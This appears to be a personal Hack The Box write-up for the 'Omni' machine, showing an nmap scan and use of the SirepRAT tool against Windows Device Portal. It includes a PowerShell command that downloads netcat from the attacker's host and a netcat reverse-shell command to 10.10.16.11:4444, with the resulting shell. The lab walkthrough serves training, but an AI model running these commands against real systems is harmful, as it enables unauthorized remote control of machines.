---
title: "Omni from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Omni from HTB

`nmap` gave this:
```bash
PORT      STATE SERVICE  VERSION
135/tcp   open  msrpc    Microsoft Windows RPC
5985/tcp  open  upnp     Microsoft IIS httpd
8080/tcp  open  upnp     Microsoft IIS httpd
|_http-title: Site doesn't have a title.
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Windows Device Portal
|_http-server-header: Microsoft-HTTPAPI/2.0
29817/tcp open  unknown
29819/tcp open  arcserve ARCserve Discovery
29820/tcp open  unknown
```
searching `Windows Device Portala exploit` i found this `github` repository [https://github.com/SafeBreach-Labs/SirepRAT]
```bash
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\hostname.exe" --return_output --v
---------

---------
---------
omni

---------
---------

---------
```
This told us what user we are on machine and also that we can execute commands this way.
found a way to execute commands
```
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c hostname" --return_output --v
---------

---------
---------
omni

---------
---------

---------
```
there is no `netcat` on machine so download it from github [https://github.com/int0x33/nc.exe/blob/master/nc64.exe] and upload it to machine
```bash
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell IWR -Uri http://10.10.16.11:80/nc64.exe -Outfile c:\nc64.exe" --return_output --v
---------

---------
<HResultResult | type: 1, payload length: 4, HResult: 0x0>
```
now to get shell start `netcat` and on windows machine send this payload
```bash
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --cmd "C:\Windows\System32\cmd.exe" --args "/c c:\nc64.exe -e powershell 10.10.16.11 4444" --return_output --v
```
I got connection
```bash
rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.16.11] from (UNKNOWN) [10.10.10.204] 49671
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32>
```
I can't do more i don't know a thing about Windows exploitation T_T
